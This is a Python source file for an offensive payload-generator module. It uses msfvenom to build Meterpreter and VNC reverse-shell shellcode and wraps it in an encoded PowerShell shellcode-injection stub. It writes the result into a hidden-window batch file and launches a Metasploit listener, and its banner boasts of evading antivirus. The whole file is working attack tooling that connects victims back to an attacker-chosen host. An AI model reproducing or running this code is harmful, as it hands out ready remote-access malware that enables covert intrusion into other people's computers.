#!/usr/bin/python
#
# paygen powershell module

import base64
import sys
import subprocess
import re
import os
import time
from src.core.main import *
from src.core import menus

iface = iface_ip()

def start_rev_listener():
	PrintInfo("Starting multi handler")

	# create rc file
	rcfile = "/tmp/ps_listener.rc"
	fw = open(rcfile, "w")
	fw.write("use exploit/multi/handler\n")
	fw.write("set PAYLOAD %s\n" % payload)
	fw.write("set LHOST 0.0.0.0\n")
	fw.write("set LPORT %s\n" % port)
	
	# for meterpreter payloads
	if not selection or selection in ('1','2'):
		fw.write("set ExitOnSession false\n")
		fw.write("set AutoRunScript migrate -f\n")

	fw.write("exploit -j -z")
	fw.close()

	# start listener
	subprocess.Popen("%s/msfconsole -r %s" % (msfpath(), rcfile), shell=True).wait()

	PrintInfo("Cleaning up...")
	os.remove(rcfile)
	os.remove(payloadfile)
	time.sleep(1)

def generate_payload(payload,ipaddr,port):
	# grab the metasploit path
	msf_path = msfpath()
		
	# generate payload
	proc = subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s c" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
	data = proc.communicate()[0]
	
	# start to format this a bit to get it ready
	data = data.replace(";", "")
	data = data.replace(" ", "")
	data = data.replace("+", "")
	data = data.replace('"', "")
	data = data.replace("\n", "")
	data = data.replace("buf=", "")
	data = data.rstrip()
	
	# sub in \x for 0x
	data = re.sub("\\\\x", "0x", data)
	
	# base counter
	counter = 0
	# count every four characters then trigger mesh and write out data
	mesh = ""
	# ultimate string
	newdata = ""
	for line in data:
		mesh = mesh + line
		counter = counter + 1
		if counter == 4:
			newdata = newdata + mesh + ","
			mesh = ""
			counter = 0

	# heres our shellcode prepped and ready to go
	shellcode = newdata[:-1]
			
	# powershell command here, needs to be unicoded then base64 in order to use encodedcommand
	powershell_command = ('''$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };''' % (shellcode))

	# blank command will store our fixed unicode variable
	blank_command = ""

	# loop through each character and insert null byte
	for char in powershell_command:
		# insert the nullbyte
		blank_command += char + "\x00"
	
	# assign powershell command as the new one
	powershell_command = blank_command
	# base64 encode the powershell command
	powershell_command = base64.b64encode(powershell_command)
	# return the powershell code
	return powershell_command

while 1:
	try:
		clear()
		print colours.bold + colours.green + \
"""#################################################################
# This powershell module currently has a 100% AV evasion rate.  #
#                                                               #
# Compatible with XP, 2k3, 7 & 2k8.                             #
# The payload requires the target to have powershell installed. #
#################################################################""" + colours.reset
		
		menus.powershell_menu()
		selection = raw_input("%sSelection > %s" % (colours.bold, colours.reset))
		if selection == '1' or selection == '':
			payload = 'windows/meterpreter/reverse_tcp'
		elif selection == '2':
			payload = 'windows/x64/meterpreter/reverse_tcp'
		elif selection == '3':
			payload = 'windows/meterpreter/reverse_http'
		elif selection == '4':
			payload = 'windows/meterpreter/reverse_https'
		elif selection == '5':
			payload = 'windows/vncinject/reverse_tcp'
			
		# get some details
		#if selection == range(1,3) or selection == '':
		ipaddr = raw_input("\nEnter IP address (default %s): " % iface )
		if ipaddr == '':
			ipaddr = iface
		port = raw_input("Enter port (default 8080): ")
		if port == '':
			port = '8080'
			
		# create payload bat file in /tmp
		PrintInfo("Creating output/paygen-pl.bat")
		payload2 = generate_payload(payload, ipaddr, port)
		payloadfile = "output/paygen-pl.bat"
		fw = open(payloadfile, "w")
		fw.write("@echo off\n")
		fw.write("\n")
		fw.write("powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand %s" % payload2)
		fw.close()
		time.sleep(2)

		listener = raw_input("\nStart MSF listener (Y/N):")
		if listener == 'Y' or listener == 'y' or listener == '':
			start_rev_listener()
		else:
			try:
				import pynotify1
				import pygtk
				pygtk.require('2.0')
				if not pynotify.init("PayGen"):
					pass
				
				n = pynotify.Notification("Finished", "Powershell payload generated in %s" % payloadfile)
		
				if not n.show():
					PrintInfo("Notifcation failed")
					pass
			except:
				pass
		
		# Return to main
		EntContinue()
		break
	except KeyboardInterrupt:
		break
